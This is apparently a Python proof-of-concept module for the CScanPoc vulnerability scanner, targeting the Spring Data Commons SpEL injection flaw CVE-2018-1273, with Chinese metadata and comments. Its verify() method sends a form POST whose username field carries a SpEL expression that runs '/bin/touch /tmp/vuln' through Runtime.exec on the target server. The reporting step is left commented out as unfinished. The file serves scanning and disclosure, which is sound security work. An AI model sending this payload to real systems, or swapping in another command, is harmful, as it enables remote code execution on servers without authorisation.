# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'Spring-Framework_0001_p'  # 平台漏洞编号，留空
    name = 'Spring-Framework Data Commons远程代码执行漏洞'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.RCE  # 漏洞类型
    disclosure_date = '2018-04-12'  # 漏洞公布时间
    desc = '''
    Spring-Framework Data Commons存在远程代码执行漏洞。该是由于Spring Data Commons模块对特殊属性处理时会使用SpEl表达式，导致攻击者可以通过构造特殊的URL请求，造成服务端远程代码执行。
    '''  # 漏洞描述
    ref = 'http://www.cnvd.org.cn/flaw/show/CNVD-2018-07566'  # 漏洞来源
    cnvd_id = 'CNVD-2018-07566'  # cnvd漏洞编号
    cve_id = 'CVE-2018-1273'  # cve编号
    product = 'Spring-Framework'  # 漏洞应用名称
    product_version = '''
    Spring Data Commons 1.13 至 1.13.10(Ingalls SR10)
    Spring Data REST 2.6 至 2.6.10 (Ingalls SR10)
    Spring Data Commons 2.0 至 2.0.5 (Kay SR5)
    Spring Data REST 3.0 至 3.0.5 (Kay SR5)'''  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '07d16002-fc99-4380-b983-848e6fbd2631'
    author = 'cscan'  # POC编写者
    create_date = '2018-04-26'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            # 命令执行漏洞验证,这里去ping一个服务器做测试或者用dnslog去验证,具体验证结果等服务器搭建起来去完善.
            data = '''username[#this.getClass().forName("java.lang.Runtime").getRuntime().exec("/bin/touch /tmp/vuln")]=test&password=test&repeatedPassword=test'''
            headers = {'Content-Type': 'application/x-www-form-urlencoded'}
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            request = requests.post('{target}'.format(
                target=self.target), data=data, headers=headers)
            r = request.text
            # if :
            #    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target,name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
